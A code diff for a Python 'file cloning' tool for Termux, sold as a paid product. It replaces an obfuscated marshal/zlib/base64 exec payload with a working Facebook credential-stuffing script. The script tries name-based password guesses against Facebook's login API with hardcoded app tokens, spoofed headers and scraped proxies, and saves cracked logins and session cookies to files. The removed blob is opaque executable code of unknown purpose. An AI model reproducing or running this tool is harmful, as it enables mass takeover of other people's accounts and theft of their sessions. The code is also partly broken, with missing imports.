@@ -1,5 +1,179 @@
-# Compiled By Mr Mafia | Muhammad Muzammil
-# Github :  https://github.com/Muzammil-404
-
+#------------import------------#
+import os
+from time import sleep as slp
+from concurrent.futures import ThreadPoolExecutor as ted
+import random
+import httpx
+import json
+import sys
 import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+#++++++++ USERAGENT & PROTECTOR +++++++#
+def testing_ua():
+        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/126.0.0.92.83;FBBV/326446619;FBDM/{density=3.0,width=1080,height=2130};FBLC/mk_MK;FBRV/433511452;FBCR/SMART;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Oppo 537 Ultra;FBSV/Android 10;FBOP/9;FBCA/armeabi-v7a:armeabi;]'
+        return ua
+
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'sessions.py','r').read():
+	pass
+else:
+    exit('😀😀😀😄😄😄')
+#++++++++ DONE ✅ +++++++#    
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+#------------------[ SHADIN-KING ]-------------------#
+os.system('clear')
+#------------logo------------#
+logo=("""\x1b[1;96m
+.d8888. db   db  .d8b.  d8888b. d888888b d8b   db \033[1;33m
+88'  YP 88   88 d8' `8b 88  `8D   `88'   888o  88 \033[1;32m
+`8bo.   88ooo88 88ooo88 88   88    88    88V8o 88 \033[1;97m
+  `Y8b. 88~~~88 88~~~88 88   88    88    88 V8o88 \033[1;32m
+db   8D 88   88 88   88 88  .8D   .88.   88  V888 \x1b[1;96m
+`8888Y' YP   YP YP   YP Y8888D' Y888888P VP   V8P \033[1;33
+ \033[1;91m——————————————————————————————————————————————————""")
+#------------clear------------#
+def clear():
+	os.system('clear')
+	print(logo)
+	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mDEVOLOPER \033[1;91m● \033[1;32mSHADIN AFRIDI\x1b[1;91m ')
+	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mVERSION   \033[1;91m● \033[1;32mFILE\033[1;91m [\033[1;32m1.0\033[1;91m] \033[1;32m ')
+	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mFACEBOOK  \033[1;91m● \033[1;32mMD REDOY DEOUN\x1b[1;91m ')
+	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mSTATUS    \033[1;91m● \033[1;32mPAID ')
+	print(50*'—')
+#------------line------------#
+def line():
+    print(50*'—')
+#----------menu----------#
+def main():
+    clear()
+    print('\033[1;91m[\033[1;32mA\033[1;91m] \033[1;32mFILE CLONING ')
+    print('\033[1;91m[\033[1;32mE\033[1;91m] \033[1;32mEXIT ')
+    line()
+    option=input('\033[1;91m[\033[1;32m??\033[1;91m] \033[1;32mCHOICE MENU ❯ ')
+    if option in ['a','A','1']:
+        __file__()
+    else:
+        exit('\x1b[1;96m THANKS FOR USING SHADIN TOOL ')
+#----------file----------#
+def __file__():
+    clear()
+    filex=input('\x1b[0m[??] ENTER FILE PATH \033[1;32m❯ ')
+    try:
+        fo=open(filex,'r').read().splitlines()
+    except FileNotFoundError:
+        print('\x1b[1;96m File not found !!');slp(2)
+        __file__()
+    clear()
+    try:
+        pas_limit=int(input('\x1b[0m[??] ENTER PASSWORD LIMIT (1-30) \033[1;32m❯ '))
+    except:
+        pas_limit=1
+    line()
+    pas_list=[]
+    for i in range(pas_limit):
+        pasx=input(f'\x1b[0m[??] ENTER PASSWORD {i+1} :\x1b[1;96m ')
+        pas_list.append(pasx)
+    with ted(max_workers=30) as Shadin:
+        tl=str(len(fo))
+        clear()
+        print('\033[1;91m[\033[1;32m≈\033[1;91m]\x1b[1;96mTOTAL ACCOUNT \033[1;91m❯\033[1;32m '+tl)
+        print('\033[1;91m[\033[1;32m≈\033[1;91m]\033[1;33m[\033[1;32mON\033[1;97m/\033[1;91mOF\033[1;33m]\033[1;32m AIRPLANE MODE FOR SPEED UP')
+        line()
+        for user in fo:
+            ids,names=user.split('|')
+            passlist=pas_list
+            Shadin.submit(m1,ids,names,passlist)
+    print(50*'—')      
+    print(' \x1b[1;96mTHE PROCESS HAS BEEN COMPLETE')
+    input(' \033[1;33mPRESS ENTER TO BACK : ')
+    main()
+loop=0
+oks=[]
+cps=[]
+#----------method------------#
+def m1(ids,names,passlist):
+    global oks,loop
+    try:
+        fn=names.split(' ')[0]
+        try:
+            ln=names.split(' ')[1]
+        except:
+            ln=fn
+        for pw in passlist:
+            sys.stdout.write('\r\r\033[1;91m[\033[1;32mSHADIN-143\033[1;91m] \033[1;32m\033[1;33m%s\033[1;97m | \033[1;32mOK : %s '%(loop,len(oks)));sys.stdout.flush()
+            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'User-Agent': testing_ua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url='https://b-graph.facebook.com/auth/login'
+            req=httpx.post(url,data=data,headers=head).json()
+            if 'session_key' in req:
+                print('\r\r\033[1;91m[\033[1;32mSHADIN-OK-💚\033[1;91m]\033[1;32m '+ids+ '|' +pas)
+                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
+                print("\r\r\033[1;91m[\033[1;32mCOKI\033[1;91m] \033[1;33m: \033[1;37 "+coki)
+                open('/sdcard/SHADIN-FILE-OK.txt', 'a').write( ids+' | '+pas+' | '+coki+' \n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in req['error']['message']:
+                print('\r\r\033[1;91m [SHADIN-CP-💔] '+ids+'|'+pas)
+                open('/sdcard/SHADIN-FILE-CP.txt', 'a').write( ids+' | '+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#----------end----------#
+import os,httpx
+def approval():
+    SHADIN="SHADIN-"
+    RUPA="OBROY"
+    uuid=str(os.getuid()) + str(os.getlogin())
+    key = "S".join(uuid)
+    ress=httpx.get("https://github.com/SHADIN-143/SHADIN-FILE/blob/main/Approval.txt").text
+    if key in ress:
+        main()
+    else:
+        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32mKEY IS NOT APPROVED")
+        os.system("clear")
+        print(logo)
+        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mDEVOLOPER \033[1;91m● \033[1;32mSHADIN AFRIDI\x1b[1;91m ')
+        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mVERSION   \033[1;91m● \033[1;32mFILE\033[1;91m [\033[1;32m1.0\033[1;91m] \033[1;32m ')
+        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mFACEBOOK  \033[1;91m● \033[1;32mMD REDOY DEOUN\x1b[1;91m ')
+        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mSTATUS    \033[1;91m● \033[1;32mPAID ')
+        print("\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mTOOL IS PAID SO YOU NEED PERMITION TO USE")
+        print(50*'—')
+        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32m7 DAY 300 ")
+        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32m15 DAY 500 ")
+        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32mYour key :\x1b[1;96m "+SHADIN+RUPA+key)
+        print(50*'—')
+        name = input("\033[1;32mYOUR NAME : ")
+        os.system("xdg-open https://wa.me/+8801863231665")
+approval()
